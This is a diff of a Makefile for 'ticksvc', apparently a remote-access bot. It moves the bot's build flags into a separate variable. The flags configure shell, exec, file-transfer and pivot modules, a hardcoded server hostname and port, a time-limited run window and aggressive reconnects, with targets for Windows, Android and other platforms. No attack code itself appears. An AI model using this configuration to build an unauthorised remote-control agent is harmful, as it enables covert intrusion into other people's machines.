@@ -45,6 +45,7 @@ TARGET := $(or $(TARGET),debug)
 # Defaults for all platforms.
 
 BIN=../bin/ticksvc-$(TARGET)
+
 CFLAGS=-W -Wall -Wextra -fdata-sections -ffunction-sections -Wl,--gc-sections -Os -fPIC -static
 
 CFLAGS_ANDROID=-fdiagnostics-color=always
@@ -68,50 +69,56 @@ ANDROID_BASE_SYSROOT=/usr/lib/android-ndk/platforms/android-$(ANDROID_NDK_VERSIO
 # I recommend to leave these alone unless you really know what you're doing.
 #
 
+CFLAGS_TICK=
+
 # Uncomment to suppress all logging.
-#CFLAGS := $(CFLAGS) -DTICK_VERBOSE=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_VERBOSE=0
 
 # Uncomment to remove features and make the binary smaller.
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_CRYPTO=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_DNS=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_EXEC=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_FILE=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_SHELL=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_PIVOT=0
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_TIME_LIMIT=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_CRYPTO=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_DNS=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_EXEC=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_FILE=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_SHELL=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_PIVOT=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_TIME_LIMIT=0
 
 # Uncomment and edit for fully hardcoded, non configurable bots.
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_ARGV=0
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_ENV=0
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_FILE=0
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_HOSTNAME=your.server.com
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_PORT=443
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_HOSTNAME=your.server.com
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_PORT=443
 
 # Uncomment and edit for a hardcoded configuration file.
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_ARGV=0
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_ENV=0
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_USE_FILE=1
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_FILE_NAME=/etc/tick.conf
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ARGV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_ENV=0
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_USE_FILE=1
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_FILE_NAME=/etc/tick.conf
 
 # Uncomment for a one month time window starting now.
-#CFLAGS := $(CFLAGS) -DTICK_FEATURES_TIME_LIMIT=1
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_TIME_LIMIT_START=$$(date +%s)
-#CFLAGS := $(CFLAGS) -DTICK_CONFIG_TIME_LIMIT_END=$$(expr `date +%s` + 2592000)
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_FEATURES_TIME_LIMIT=1
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_TIME_LIMIT_START=$$(date +%s)
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONFIG_TIME_LIMIT_END=$$(expr `date +%s` + 2592000)
 
 # Uncomment for really noisy but fast reconnects.
-#CFLAGS := $(CFLAGS) -DTICK_CONNECT_RETRY_TIMES=-1
-#CFLAGS := $(CFLAGS) -DTICK_CONNECT_RETRY_PAUSE=1
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONNECT_RETRY_TIMES=-1
+#CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_CONNECT_RETRY_PAUSE=1
 
 ##############################################################################
 # Platform dependent configuration.
 
 # Debug compilation for the local platform.
 # This is the default. Keeps the debugging symbols and forces verbose output.
+# Also forces dynamic linking since we only need the binary to run in the
+# same machine where we are compiling it.
 ifeq ($(TARGET),debug)
 CC=gcc
 ST=@true
-CFLAGS := $(filter-out -DTICK_VERBOSE=0,$(CFLAGS))
-CFLAGS := $(CFLAGS) -g -DTICK_VERBOSE=1
+CFLAGS=-W -Wall -Wextra -g
+CFLAGS := $(filter-out -static,$(CFLAGS))
+CFLAGS_TICK := $(filter-out -DTICK_VERBOSE=0,$(CFLAGS_TICK))
+CFLAGS_TICK := $(CFLAGS_TICK) -DTICK_VERBOSE=1
 
 #----------------------------------------------------------------------------#
 
@@ -210,6 +217,8 @@ CC=$(FLAVOR)-gcc
 ST=$(FLAVOR)-strip
 CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86)
 BIN := $(BIN).exe
+CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
+CFLAGS_TICK := $(CFLAGS_TICK) -g -DTICK_CONFIG_USE_ARGV=1
 
 # Generic Windows on 64 bit Intel platforms.
 else ifeq ($(TARGET),generic-x86_64-windows)
@@ -218,6 +227,8 @@ CC=$(FLAVOR)-gcc
 ST=$(FLAVOR)-strip
 CFLAGS := $(CFLAGS) $(CFLAGS_WINDOWS) $(CFLAGS_X86_64)
 BIN := $(BIN).exe
+CFLAGS_TICK := $(filter-out -DTICK_CONFIG_USE_ARGV=0,$(CFLAGS_TICK))
+CFLAGS_TICK := $(CFLAGS_TICK) -g -DTICK_CONFIG_USE_ARGV=1
 
 #----------------------------------------------------------------------------#
 
@@ -236,7 +247,7 @@ SRC=$(wildcard *.c)
 # If SSL is enabled, add the BearSSL source code and includes.
 # We need this because the compiler won't always be removing the unused code
 # by itself, even when we explicitly told it to. (I'm looking at you, mingw)
-ifneq ($(filter -DTICK_FEATURES_CRYPTO=0,$(CFLAGS)),)
+ifneq ($(filter -DTICK_FEATURES_CRYPTO=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out base64.c,$(SRC))
 	SRC := $(filter-out ssl.c,$(SRC))
 else
@@ -246,16 +257,16 @@ else
 endif
 
 # Remove other modules based on the feature list too.
-ifneq ($(filter -DTICK_FEATURES_DNS=0,$(CFLAGS)),)
+ifneq ($(filter -DTICK_FEATURES_DNS=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out dns.c,$(SRC))
 endif
-ifneq ($(filter -DTICK_FEATURES_FILE=0,$(CFLAGS)),)
+ifneq ($(filter -DTICK_FEATURES_FILE=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out file.c,$(SRC))
 endif
-ifneq ($(filter -DTICK_FEATURES_SHELL=0,$(CFLAGS)),)
+ifneq ($(filter -DTICK_FEATURES_SHELL=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out shell.c,$(SRC))
 endif
-ifneq ($(filter -DTICK_FEATURES_PIVOT=0,$(CFLAGS)),)
+ifneq ($(filter -DTICK_FEATURES_PIVOT=0,$(CFLAGS_TICK)),)
 	SRC := $(filter-out pivot.c,$(SRC))
 endif
 
@@ -279,7 +290,7 @@ all:
 	@echo Finished building for platform: $(TARGET)
 
 %.o: %.c
-	$(CC) -c $< $(CFLAGS) -o $@
+	$(CC) -c $< $(CFLAGS) $(CFLAGS_TICK) -o $@
 
 #../bin/ticksvc-%: $(SRC)
 ../bin/ticksvc-%: $(OBJ)
